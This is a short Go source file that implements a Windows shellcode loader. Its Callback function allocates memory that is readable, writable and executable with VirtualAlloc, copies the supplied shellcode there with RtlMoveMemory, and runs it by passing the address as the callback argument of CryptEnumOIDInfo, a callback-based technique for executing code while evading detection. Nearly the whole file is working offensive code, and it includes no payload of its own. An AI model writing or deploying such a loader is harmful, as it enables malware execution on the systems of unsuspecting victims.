package TT

import (
	"syscall"
	"unsafe"
)

var (
	timer int
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32         = syscall.MustLoadDLL("kernel32.dll")
	ntdll            = syscall.MustLoadDLL("ntdll.dll")
	Crypt32          = syscall.MustLoadDLL("Crypt32.dll")
	VirtualAlloc     = kernel32.MustFindProc("VirtualAlloc")
	RtlMoveMemory    = ntdll.MustFindProc("RtlMoveMemory")
	CryptEnumOIDInfo = Crypt32.MustFindProc("CryptEnumOIDInfo")
)

func Callback(shellcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	CryptEnumOIDInfo.Call(0, 0, 0, addr)
}
